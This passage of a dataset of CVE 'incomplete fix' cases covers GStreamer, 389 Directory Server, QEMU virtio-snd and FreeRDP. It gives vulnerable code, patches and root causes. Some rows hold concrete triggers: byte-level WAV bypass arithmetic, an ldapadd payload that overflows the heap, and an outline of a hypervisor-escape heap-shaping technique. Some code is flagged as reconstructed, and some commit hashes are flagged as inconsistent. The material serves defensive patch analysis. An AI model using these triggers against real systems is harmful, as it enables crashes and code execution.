+ size   -= advance;","gst/wavparse/gstwavparse.c, gst_wavparse_adtl_chunk(), guard expression replaced (same location as original fix)","NVD description: ""The patch added a size validation check lsize + 8 > size, but it does not account for the GST_ROUND_UP_2(lsize) used in the actual offset calculation."" Corrected guard derives directly from the same expression used for the stride.","Guard expression and stride/advance expression not derived from the same formula (guard used raw value, advance used rounded value); RIFF alignment semantics undocumented at the call site; no regression test for odd-lsize inputs; batch-fix review-thoroughness pressure (46 patches in one MR)","Precise bypass arithmetic given (no standalone script, but exact byte-level construction provided)","Craft a WAV file with a LIST:adtl chunk of total size N; place inside it a sub-chunk with lsize = N-9 (odd, so lsize+8 = N-1). Guard: (N-9)+8=N-1, N-1>N is false, loop continues. Advance: 8+GST_ROUND_UP_2(N-9)=8+(N-8)=N bytes consumed; size underflows to 0xFFFFFFFF; next GST_READ_UINT32_LE reads 4 bytes past the allocated buffer -> OOB read (crash via SIGSEGV or heap information disclosure).","Any application using GStreamer's wavparse plugin to process untrusted WAV files: GNOME Videos/Totem opening a WAV directly; PipeWire/GStreamer ALSA-PulseAudio pipelines; Firefox on Linux (GStreamer backend for certain audio/video decoding configs); embedded/IoT Linux (Yocto/OpenEmbedded, Raspberry Pi OS, automotive IVI); GStreamer-based streaming servers parsing user-uploaded WAV content.","GStreamer < 1.28.1 (all versions with the CVE-2024-47778 patch applied but not the corrected guard)","CVE-2024-47778/GHSL-2024-258: Antonio Morales, GitHub Security Lab. CVE-2026-1940: Red Hat, Inc. (CNA); researcher who noticed the discrepancy while auditing the patch (unnamed).","NVD: ""The patch added a size validation check lsize + 8 > size, but it does not account for the GST_ROUND_UP_2(lsize) used in the actual offset calculation.""","INCOMPLETE FIX (per user definition).","https://nvd.nist.gov/vuln/detail/CVE-2026-1940 ; https://securitylab.github.com/advisories/GHSL-2024-258_Gstreamer/ ; https://gstreamer.freedesktop.org/security/sa-2026-0001.html ; https://bugzilla.redhat.com/show_bug.cgi?id=2436932 ; https://gitlab.freedesktop.org/gstreamer/gstreamer/-/commit/13b48016b3ef1e822c393c2871b0a561ce19ecb3 ; https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/4854 ; https://access.redhat.com/errata/RHSA-2025:7242","Report gives no specific commit hash for the CVE-2026-1940 complete fix itself, only the advisory/version it shipped in (GStreamer 1.28.1, SA-2026-0001) -- flagged as a gap rather than fabricated."
"CASE-08","389 Directory Server (389-ds-base) — LDAP directory server underlying Red Hat Directory Server and FreeIPA","C","ldap/servers/slapd/schema.c","schema_attr_enum_callback(); schema_oc_to_string(); read_schema_dse(); compute_base_oc_string_size() (referenced helper)","CVE-2025-14905","CWE-122 (Heap-based Buffer Overflow)","Not separately given in report for original CVE","schema_attr_enum_callback() builds the buffer for an attribute type definition's NAME field by summing alias string lengths but failing to account for required formatting separators (spaces, dollar signs, parentheses) between them. For many aliases, the cumulative shortfall in the size estimate lets strcat() overflow the heap.","/* BEFORE CVE-2025-14905 fix -- buffer size calculation: */
size_t sz = base_size;
for (int i = 0; i < num_aliases; i++) {
  sz += strlen(aliases[i]);      /* counts alias text only */
  /* MISSING: +3 for ' $ ' separator between aliases */
  /* MISSING: +4 for '( ' prefix and ' )' suffix for multi-alias */
}
buf = slapi_ch_malloc(sz);
/* strcat() calls then write MORE than sz bytes -> heap overflow */","Not given in report","Not given in report","Fix tracked via Red Hat Bugzilla #2423624","Early 2025 (developed); assigned/published Feb 2026","Not specifically versioned in report","Not specified","Adds the missing separator lengths (' $ ' between aliases, '( ' / ' )' wrapping for multi-alias lists) to the size accumulator in schema_attr_enum_callback(), ensuring the buffer is large enough for all alias strings plus formatting characters.","ldap/servers/slapd/schema.c, schema_attr_enum_callback()","Corrects the NAME-alias buffer size miscalculation for attribute type definitions.","CVE-2026-11884","CWE-122 (Heap-based Buffer Overflow)","6.5 MEDIUM (RH CNA) -- AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H; NVD CVSS not yet assigned per report (status: Awaiting NVD enrichment)","schema_oc_to_string() and read_schema_dse() (objectclass serialization, not attribute type serialization) also strcat() the 'SUP' (superior objectclass) field, but oc_superior's strlen is never included in the buffer size pre-calculation in either function -- overflow regardless of the CVE-2025-14905 fix, which only touched the alias-separator accounting for attribute types.","CVE-2025-14905 fix was scoped to schema_attr_enum_callback() -- the alias enumeration path specifically for ATTRIBUTE TYPES -- and did not trigger a systematic audit of the other functions in schema.c using the same brittle 'pre-calc size -> malloc -> strcat each field' pattern. oc_superior/SUP exists only on OBJECTCLASS definitions (a disjoint code path from attribute types), so the attribute-type-focused fix had no reason to encounter it, even though the underlying bug class (field written by strcat but never counted in size) is identical.","static char * schema_oc_to_string (struct objclass *oc, int schema_ds4x_compat) {
  size_t sz; char *buf;
  sz  = strlen(oc->oc_oid)   + 4;   /* ( <OID> ) */
  sz += strlen(oc->oc_name)  + 8;   /* NAME '<name>' */
  if (oc->oc_desc) sz += strlen(oc->oc_desc) + 8;   /* DESC '<desc>' */
  /* SUP field -- NOT ADDED TO sz */
  sz += oc_kind_to_string_len(oc->oc_kind);
  sz += must_may_list_len(oc);
  sz += origin_list_len(oc);
  buf = slapi_ch_malloc(sz); memset(buf, 0, sz);
  strcat(buf, ""( ""); strcat(buf, oc->oc_oid);
  strcat(buf, "" NAME '""); strcat(buf, oc->oc_name); strcat(buf, ""' "");
  if (oc->oc_desc) { strcat(buf, ""DESC '""); strcat(buf, oc->oc_desc); strcat(buf, ""' ""); }
  if (oc->oc_superior) {
    strcat(buf, ""SUP "");
    strcat(buf, oc->oc_superior);  /* <- WRITES PAST END OF BUFFER, length not in sz */
    strcat(buf, "" "");
  }
  /* ... continues with STRUCTURAL/MUST/MAY ... */
}

/* read_schema_dse() -- parallel omission: */
sz = compute_base_oc_string_size(oc);  /* omits oc_superior length */
buf = slapi_ch_malloc(sz);
if (oc->oc_superior) {
  PR_snprintf(tmp, sizeof(tmp), ""SUP %s "", oc->oc_superior);
  strcat(buf, tmp);    /* overflows if strlen(oc_superior) > slack */
}","Analyst reviewing the CVE-2025-14905 patch (not individually named); reported to Red Hat, Bugzilla #2484913","May-June 2026 (reported); CVE received/published on NVD 2026-06-10","~1+ years (early-2025 fix development -> Jun 2026 report; CVE-2025-14905 itself published Feb 2026)","Not given in report (Required Fix documented as pseudocode, no commit hash provided; status 'Awaiting NVD enrichment' as of July 2026)","Not available","Required fix documented by reporter/Red Hat; not yet a confirmed public commit per report","Not yet fixed as of report date (2026-06-30 last NVD record update noted; 'NVD enrichment still pending as of July 2026')","Not yet released per report","--- ldap/servers/slapd/schema.c (before CVE-2026-11884 fix)
+++ ldap/servers/slapd/schema.c (required fix)
In schema_oc_to_string():
  sz  = strlen(oc->oc_oid)   + 4;
  sz += strlen(oc->oc_name)  + 8;
  if (oc->oc_desc) sz += strlen(oc->oc_desc) + 8;
+ if (oc->oc_superior)
+   sz += strlen(oc->oc_superior) + 5; /* 'SUP ' + value + ' ' */
  sz += oc_kind_to_string_len(oc->oc_kind);
  sz += must_may_list_len(oc);
  sz += origin_list_len(oc);
  buf = slapi_ch_malloc(sz);
In read_schema_dse() -- parallel change:
+ if (oc->oc_superior)
+   sz += strlen(oc->oc_superior) + 5;

/* Report also recommends a more robust systemic fix: replace the strcat/pre-computed-size */
/* pattern entirely with a dynamic buffer builder (slapi_ch_strdup + realloc chain, or a */
/* GString/BufWriter equivalent), eliminating the bug CLASS by construction. */","ldap/servers/slapd/schema.c, schema_oc_to_string() size-calculation block; read_schema_dse() parallel size-calculation block","Add strlen(oc->oc_superior)+5 to the buffer size pre-calculation in both schema_oc_to_string() and read_schema_dse(), matching the 'SUP <value> ' text plus null terminator actually written.","Structural brittleness of the malloc+strcat pattern (two independently maintained lists -- size calc vs. strcat calls -- must be kept in sync by hand); missing field audit on patch application; function/scope ambiguity (objectclass serialization functions considered out of scope for an attribute-type-specific CVE); high-privilege requirement (PR:H, Directory Manager) reduces urgency but not risk","Yes -- LDAP ldapadd example given","# ldapadd to cn=schema,cn=config with DM credentials:
dn: cn=schema
changetype: modify
add: objectClasses
objectClasses: ( 1.2.3.4.5 NAME 'crashMe' SUP AAAAAA...AAAA STRUCTURAL MAY description )
# 'SUP' value made long enough to overflow. Any subsequent schema serialization (client reading cn=schema, schema reload, replication sync) calls schema_oc_to_string() on the crafted objectclass, overflowing the heap buffer.","Requires Directory Manager (DM) credentials or position as a trusted replication supplier. Attacker creates/modifies an objectclass definition via LDAP with an oversized SUP value; any subsequent schema serialization event (client read of cn=schema, schema reload, replication sync) triggers the heap overflow -- impact ranges from server crash (DoS, disrupting all LDAP/Kerberos auth for domain-joined hosts in FreeIPA/RHDS deployments) to, in favourable heap conditions, arbitrary code execution on the directory server host.","All 389-ds-base versions carrying the CVE-2025-14905 patch; confirmed in RHDS 11, 12, 13 and RHEL 7-10","CVE-2025-14905 and CVE-2026-11884: both reported/tracked via Red Hat, Inc. (Bugzilla #2423624 and #2484913 respectively); individual researcher not named in report.","NVD description explicitly states: ""This is an incomplete fix variant of CVE-2025-14905.""","INCOMPLETE FIX (per user definition).","https://nvd.nist.gov/vuln/detail/CVE-2026-11884 ; https://bugzilla.redhat.com/show_bug.cgi?id=2423624 ; https://bugzilla.redhat.com/show_bug.cgi?id=2484913 ; https://access.redhat.com/security/cve/CVE-2026-11884","As of the report's preparation date (July 3, 2026), CVE-2026-11884 had NO confirmed public patch commit -- the 'Required Fix' section is the reporter's/analyst's recommended patch, not a merged fix. This should be re-checked for an actual applied commit before being treated as historical fact; status was explicitly 'Awaiting NVD enrichment' in the source document. schema_oc_to_string() code in the report is reconstructed/pseudocode ('Pseudocode reconstructed from NVD description and code structure') rather than a verbatim source excerpt."
"CASE-09","QEMU — open source machine emulator/virtualizer; virtio-snd device","C","hw/audio/virtio-snd.c","virtio_snd_handle_rx_xfer(); virtio_snd_pcm_in_cb()","CVE-2024-7730","CWE-122 (Heap-based Buffer Overflow)","Not separately given for original CVE in report","Guest-controlled in_sg iovec / in_num submitted via the rx virtqueue for audio capture. virtio_snd_handle_rx_xfer() allocates a VirtIOSoundPCMBuffer sized (iov_size - sizeof(virtio_snd_pcm_status)). If the guest provides an iov whose total size exactly equals sizeof(virtio_snd_pcm_status) (8 bytes), the allocation becomes g_malloc0(sizeof(VirtIOSoundPCMBuffer)+0) -- zero bytes for audio data -- yet virtio_snd_pcm_in_cb() still calls AUD_read() into buffer->data, overflowing the zero-sized allocation.","/* virtio_snd_handle_rx_xfer() -- buffer allocation (both CVEs) */
size = iov_size(elem->in_sg, elem->in_num) - sizeof(virtio_snd_pcm_status);
buffer = g_malloc0(sizeof(VirtIOSoundPCMBuffer) + size);
/* Bug #1 (underflow): empty iov (size=0) -> 0 - sizeof(status) wraps to huge value -> under-allocation */

/* virtio_snd_pcm_in_cb() -- filling the buffer */
max_size = iov_size(buffer->elem->in_sg, buffer->elem->in_num);  /* = 8 bytes in the reported case */
for (;;) {
  if (buffer->size >= max_size) { return_rx_buffer(stream, buffer); break; }
  size = AUD_read(stream->voice.in, buffer->data + buffer->size,
                   MIN(available, stream->params.period_bytes - buffer->size));
  /* BUG: buffer->data has 0 bytes; AUD_read writes at buffer->data+0 even when buffer->size<max_size -> overflow */
  buffer->size += size;
}
/* Three distinct bugs identified: #1 underflow on empty iov; #2 8-byte OOB when iov==status size exactly; */
/* #3 unbounded write -- AUD_read bounded by MIN(available, period_bytes-buffer->size), neither of which is */
/* the actual allocation size; period_bytes is guest-controlled via VIRTIO_SND_R_PCM_SET_PARAMS */","bcb53328aa70023f1405fade4e253e7f77567261 (allocation-side reject); 7994203bb1b83a6604f3ab00fe9598909bb66164 (fill-loop bound)","https://gitlab.com/qemu-project/qemu/-/commit/bcb53328aa70023f1405fade4e253e7f77567261 ; https://gitlab.com/qemu-project/qemu/-/commit/7994203bb1b83a6604f3ab00fe9598909bb66164","QEMU 8.2.x patch series, two commits","August 2024","QEMU 8.2.x patch series","Not specified in report","/* Commit bcb53328 -- reject iov too small to hold status header */
+ if (iov_size(elem->in_sg, elem->in_num) <= sizeof(virtio_snd_pcm_status)) {
+     virtqueue_detach_element(vq, elem, 0);
+     g_free(elem);
+     continue;
+ }
  size = iov_size(elem->in_sg, elem->in_num) - sizeof(virtio_snd_pcm_status);
  buffer = g_malloc0(sizeof(VirtIOSoundPCMBuffer) + size);

/* Commit 7994203b -- bound AUD_read to actual allocated capacity */
max_size = iov_size(buffer->elem->in_sg, buffer->elem->in_num);
size = AUD_read(stream->voice.in, buffer->data + buffer->size,
-                 MIN(available, stream->params.period_bytes - buffer->size));
+                 MIN(available,
+                     MIN(stream->params.period_bytes,
+                         max_size - sizeof(virtio_snd_pcm_status))
+                     - buffer->size));","hw/audio/virtio-snd.c, virtio_snd_handle_rx_xfer() (allocation guard) and virtio_snd_pcm_in_cb() (fill-loop bound)","Reject any iov whose total size is <= sizeof(virtio_snd_pcm_status) at allocation time; bound the AUD_read() fill amount by MIN(period_bytes, max_size-sizeof(status)) rather than period_bytes alone. Addresses the specific reported case where iov size equals exactly the status header size.","CVE-2026-3195","CWE-122 (Heap-based Buffer Overflow)","7.4 HIGH -- CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H","Same function, different triggering condition; iov capacity check still missing. The bcb53328 guard only rejects iov <= status size (i.e., <=8 bytes); it accepts any iov larger than 8 bytes, e.g. 9 bytes (allocation of 1 byte). If the guest sets period_bytes large via VIRTIO_SND_R_PCM_SET_PARAMS, the MIN() in virtio_snd_pcm_in_cb() still resolves toward period_bytes-buffer->size, which can far exceed the actual 1-byte allocation -- AUD_read() then writes up to ~4096 bytes past the single-byte buffer->data allocation.","The allocation-side guard (bcb53328) was too narrow -- it only blocked the exact '=8 bytes' case reported in CVE-2024-7730, not any small-but-nonzero iov. The fill-side bound (7994203b) still allowed period_bytes (fully guest-controlled) to dominate the MIN() calculation whenever the allocation was small; the iov capacity was never properly compared against the period size in the fill path, so guest control over period_bytes remained sufficient to drive an out-of-bounds write.","/* INCOMPLETE bound in virtio_snd_pcm_in_cb() after CVE-2024-7730 fix */
max_size = iov_size(buffer->elem->in_sg, buffer->elem->in_num);  /* FULL iov size, includes status header bytes */
MIN(available,
    MIN(stream->params.period_bytes,
        max_size - sizeof(virtio_snd_pcm_status))  /* subtracts 8; == allocation size, looks correct... */
    - buffer->size)
/* BUT: if iov is small (e.g. 9 bytes -> allocation = g_malloc0(...+1)) and period_bytes is set large by */
/* the guest, MIN() still can resolve to period_bytes - buffer->size, which exceeds the 1-byte allocation. */
/* AUD_read() writes 'available' bytes (up to 4096 in practice) past the single-byte buffer->data. */","DARKNAVY (DarkNavyOrg) and Mingyuan Luo (Red Hat acknowledgment); OtterSec independently found the same bugs and built a working guest-to-host escape exploit (March 2026 writeup)","OtterSec writeup dated 2026-03-17 (""From virtio-snd 0-Day to Hypervisor Escape"")","~19 months (Aug 2024 fix -> Mar 2026 exploit writeup)","bcb53328 & 7994203b (report's Event Summary table lists these SAME two hashes as delivering BOTH the original and the complete fix, described as 'fully fixing all three sub-bugs' as of Jun 2026 -- see misc_notes for the apparent internal inconsistency)","https://gitlab.com/qemu-project/qemu/-/commit/bcb53328aa70023f1405fade4e253e7f77567261 ; https://gitlab.com/qemu-project/qemu/-/commit/7994203bb1b83a6604f3ab00fe9598909bb66164","QEMU 10.2.1+ complete fix","June 2026 (per report header table: ""Commits bcb53328 + 7994203b fully fixing all three sub-bugs (Jun 2026)"")","QEMU 10.2.1+","/* virtio_snd_pcm_in_cb() -- complete fix */
max_size = iov_size(buffer->elem->in_sg, buffer->elem->in_num) - sizeof(virtio_snd_pcm_status);  /* actual capacity */
for (;;) {
  if (buffer->size >= max_size) { return_rx_buffer(stream, buffer); break; }
  size = AUD_read(stream->voice.in, buffer->data + buffer->size,
+                     MIN(available, max_size - buffer->size));  /* bounded by allocation, period_bytes removed from bound */
}
/* Key change: period_bytes is removed from the bound entirely -- write is now bounded strictly by */
/* max_size - buffer->size where max_size derives from the actual allocation, eliminating guest control */
/* over write size. */","hw/audio/virtio-snd.c, virtio_snd_pcm_in_cb() fill loop","Direct comparison between allocation size and AUD_read() request amount; period_bytes fully removed from the bound so the guest can no longer influence write size beyond the actual allocated capacity.","Allocation-side guard too narrow (blocked only the exact reported boundary case); fill-side bound still trusted a fully guest-controlled parameter (period_bytes) instead of deriving strictly from the real allocation size","Yes -- OtterSec built and demonstrated a full guest-to-host hypervisor escape","OtterSec (Mar 2026): unbounded write (Bug #3) exploitable even though written bytes are host audio samples (not directly guest-controlled) -- using u8 PCM format (silence=0x80), overflow bytes tend to be 0x80, which on little-endian systems makes corrupted size fields point to larger tcache bins, enabling chunk-size manipulation. Paired with virtio-9p's xattr allocation (arbitrary-sized persistent heap allocations) for heap shaping. Achieved code execution in the host QEMU process via VirtQueue.handle_output function-pointer overwrite -- demonstrated by launching gnome-calculator on the host from inside the guest.","A malicious or compromised guest VM submits a small (but >8-byte) rx-virtqueue iov and sets a large period_bytes via VIRTIO_SND_R_PCM_SET_PARAMS; the host's audio backend then writes captured audio samples past the small allocation, corrupting adjacent heap metadata and, combined with heap-shaping via virtio-9p, achieving guest-to-host code execution (hypervisor escape).","QEMU 8.2.0 to 10.2.1","DARKNAVY (DarkNavyOrg) and Mingyuan Luo (Red Hat acknowledgment); OtterSec (independent discovery + exploit).","""This issue exists due to an incomplete fix for CVE-2024-7730"" (NVD signal phrase per report)","INCOMPLETE FIX (per user definition).","https://nvd.nist.gov/vuln/detail/CVE-2026-3195 ; https://nvd.nist.gov/vuln/detail/CVE-2024-7730 ; https://osec.io/blog/2026-03-17-virtio-snd-qemu-hypervisor-escape/ ; https://gitlab.com/qemu-project/qemu/-/commit/bcb53328aa70023f1405fade4e253e7f77567261 ; https://gitlab.com/qemu-project/qemu/-/commit/7994203bb1b83a6604f3ab00fe9598909bb66164 ; https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2024-7730 ; http://www.mail-archive.com/debian-bugs-dist@lists.debian.org/msg2087816.html ; https://lore.kernel.org/qemu-devel/[email protected]/","Report is internally inconsistent regarding commit hashes: the SAME two hashes (bcb53328, 7994203b) are labeled in the 'At a glance' header as 'Original fix' AND, separately, as the 'Complete fix' (""fully fixing all three sub-bugs (Jun 2026)"") in the Timeline table. This strongly suggests the source document conflated or reused hashes rather than providing a distinct complete-fix commit for CVE-2026-3195; the actual QEMU 10.2.1+ commit(s) that added the period_bytes-removed bound could not be independently confirmed via the source document and were not separately verified via web search in this pass -- flagged for follow-up verification against the live QEMU git history."
"CASE-10","FreeRDP — free/open-source RDP client library and clients; SDL2 and SDL3 GUI client trees","C++","client/SDL/SDL3/sdl_pointer.cpp (fixed first); client/SDL/SDL2/sdl_pointer.cpp (fixed second, initially missed)","sdl_Pointer_New()","CVE-2026-24680","CWE-416 (Use After Free)","Not separately given for original CVE in report (see incomplete-fix CVE for combined class CVSS)","sdl_Pointer_New() allocates a pixel-data buffer (ptr->data) via winpr_aligned_malloc(), then calls freerdp_image_copy_from_pointer_data() to fill it from RDP cursor data. If that call fails, ptr->data is freed via winpr_aligned_free(), but the pointer is NOT set to nullptr. Any subsequent code path that reads/reuses ptr->data (a retry, sdl_Pointer_Free(), another cursor update) operates on a dangling pointer -- use-after-free. Identical bug present in both the SDL2 and SDL3 implementations (same code, same line numbers, different SDL API calls for cursor creation).","static BOOL sdl_Pointer_New(rdpContext* context, rdpPointer* pointer) {
  auto* ptr = reinterpret_cast<sdlPointer*>(pointer);
  auto* sdl  = get_context(context);
  ptr->data = static_cast<Uint8*>(winpr_aligned_malloc(ptr->scanline * ptr->pointer.height, 16));
  if (!ptr->data) return FALSE;
  if (!freerdp_image_copy_from_pointer_data(
        ptr->data, PIXEL_FORMAT_BGRA32, ptr->scanline, 0, 0,
        ptr->pointer.width, ptr->pointer.height,
        ptr->pointer.xorMaskData, ptr->pointer.lengthXorMask,
        ptr->pointer.andMaskData, ptr->pointer.lengthAndMask,
        ptr->pointer.xPos, ptr->pointer.yPos, &context->gdi->palette))
  {
    winpr_aligned_free(ptr->data);  /* free on failure */
    /* BUG: ptr->data still holds the freed address <- UAF */
    return FALSE;
  }
  /* Create SDL cursor from pixel data (SDL2: SDL_CreateCursor() / SDL3: SDL_CreateColorCursor()) */
  return TRUE;
}","c42ecbd183b001e76bfc3614cddfad0034acc758","https://github.com/FreeRDP/FreeRDP/commit/c42ecbd183b001e76bfc3614cddfad0034acc758","Single commit, message ""[client,sdl] reset pointer after memory release""","Not precisely dated beyond CVE identifier in report","Applied to SDL3 tree only","Not specified in report","@@ -61,6 +61,7 @@ static BOOL sdl_Pointer_New(rdpContext* context, rdpPointer* pointer)
  &context->gdi->palette))
 {
   winpr_aligned_free(ptr->data);
+  ptr->data = nullptr;   <- ADDED: null the pointer after free
   return FALSE;
 }","client/SDL/SDL3/sdl_pointer.cpp, sdl_Pointer_New(), line ~61-67","""[client,sdl] reset pointer after memory release"" -- single-line null assignment; correct and complete fix FOR THE SDL3 CODE PATH ONLY. After ptr->data=nullptr, subsequent use dereferences null (clean crash) rather than freed heap memory (exploitable UAF).","CVE-2026-27950","CWE-416 (Use After Free)","NVD: 7.5 HIGH (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H); GitHub CNA: 5.5 MEDIUM (CVSS 4.0)","Same use-after-free in the SDL2 implementation (client/SDL/SDL2/sdl_pointer.cpp); the CVE-2026-24680 fix was applied ONLY to the SDL3 path. ""While the vulnerable execution flow referenced in the advisory exists in the SDL2 implementation, the fix appears to have been applied only to the SDL3 code path. In the SDL2 implementation, the pointer is not nulled after free."" (GHSA-rvfg-86cr-5r6p)","Root cause: parallel code trees without shared implementation. FreeRDP maintains SDL2 and SDL3 as separate directories with duplicated logic; a bug fixed in one must be manually propagated to the other. The developer who fixed CVE-2026-24680 fixed the SDL3 path (likely where they first reproduced the issue) but did not propagate the identical one-line fix to the structurally identical SDL2 file. A simple `grep -r ""winpr_aligned_free"" client/SDL/` comparing SDL2 vs SDL3 would have revealed the divergence immediately -- described as a code-review oversight.","/* File: client/SDL/SDL2/sdl_pointer.cpp -- AFTER commit c42ecbd (NOT modified, still vulnerable) */
winpr_aligned_free(ptr->data);
/* ptr->data NOT set to nullptr here <- UAF still present */
return FALSE;

/* Compare with SDL3 file after c42ecbd: */
/*    winpr_aligned_free(ptr->data); */
/*    ptr->data = nullptr;  <- present */
/*    return FALSE; */

/* Practical risk split: FreeRDP built with SDL3 (-DWITH_SDL3=ON) is protected; */
/* FreeRDP built with SDL2 (the default on many distributions) remains vulnerable. */
/* The CVE-2026-24680 advisory stated the vulnerability was fully resolved -- not true for SDL2 builds. */","Not individually named in report (documented in GHSA-rvfg-86cr-5r6p FreeRDP Security Advisory)","Not precisely dated beyond CVE identifier / advisory in report","Not precisely quantified in report (both single-line fixes landed together in FreeRDP 3.23.0 per Timeline)","5f62aa11c1bdf00f94c40ea9ebb260a752740b80","https://github.com/FreeRDP/FreeRDP/commit/5f62aa11c1bdf00f94c40ea9ebb260a752740b80","Single commit, message ""[client,sdl] fix sdl_Pointer_New""","Released together with SDL3 fix in FreeRDP 3.23.0","FreeRDP 3.23.0","@@ -61,6 +61,7 @@ static BOOL sdl_Pointer_New(rdpContext* context, rdpPointer* pointer)
  &context->gdi->palette))
 {
   winpr_aligned_free(ptr->data);
+  ptr->data = nullptr;   <- ADDED: identical fix as c42ecbd for SDL3
   return FALSE;
 }","client/SDL/SDL2/sdl_pointer.cpp, sdl_Pointer_New(), line ~61-67 (same location as SDL3 fix)","""[client,sdl] fix sdl_Pointer_New"" / ""reset ptr->data after free."" Identical one-line fix applied to the SDL2 tree, making both SDL2 and SDL3 null the pointer after free and eliminating the UAF in all build configurations.","Duplicated/parallel code trees (SDL2 vs SDL3) without shared implementation; fix propagated to only the tree where the bug was first reproduced; code-review oversight (identical pattern in the mirror tree not checked)","Not an explicit standalone exploit script in report; mechanism (failure path in freerdp_image_copy_from_pointer_data triggering the free, followed by any subsequent read of ptr->data) is fully described","Trigger a failure inside freerdp_image_copy_from_pointer_data() during cursor creation on an FreeRDP client built with SDL2 (the default on many distros); ptr->data is freed but left non-null; any later cursor-related code path referencing ptr->data (retry, sdl_Pointer_Free(), a further cursor update) dereferences freed heap memory.","A malicious or compromised RDP server sends a cursor shape that causes freerdp_image_copy_from_pointer_data() to fail during sdl_Pointer_New() processing on an FreeRDP client built with SDL2 (default on many Linux distributions); subsequent use of the dangling ptr->data can crash the client or, depending on heap layout, be leveraged for further exploitation.","FreeRDP < 3.23.0 (all SDL2-linked builds after the SDL3-only CVE-2026-24680 fix landed)","Both CVE-2026-24680 and CVE-2026-27950 findings/fixes are documented via FreeRDP Security Advisory GHSA-rvfg-86cr-5r6p; individual researcher not named in report.","NVD/advisory: ""the fix appears to have been applied only to the SDL3 code path"" (GHSA-rvfg-86cr-5r6p)","INCOMPLETE FIX (per user definition) -- fix applied to only one of two parallel/duplicated code paths that shared the identical vulnerability.","https://nvd.nist.gov/vuln/detail/CVE-2026-27950 ; https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-rvfg-86cr-5r6p ; https://github.com/FreeRDP/FreeRDP/commit/c42ecbd183b001e76bfc3614cddfad0034acc758 ; https://github.com/FreeRDP/FreeRDP/commit/5f62aa11c1bdf00f94c40ea9ebb260a752740b80 ; https://github.com/FreeRDP/FreeRDP/blob/master/client/SDL/SDL2/sdl_pointer.cpp#L63-L64","This is a structurally simple, well-documented case (single-line fix duplicated across two near-identical files) with the most complete source-hash coverage of all 10 cases in the report."
